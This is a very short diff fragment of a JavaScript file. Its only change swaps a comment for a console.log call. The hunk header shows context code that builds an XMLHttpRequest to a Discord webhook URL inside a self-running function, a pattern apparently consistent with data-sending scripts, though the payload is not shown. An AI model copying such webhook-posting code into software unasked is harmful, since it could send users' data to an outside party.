@@ -9,4 +9,4 @@ var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/12300
     });
 })();
 
-// 1
+console.log('h')
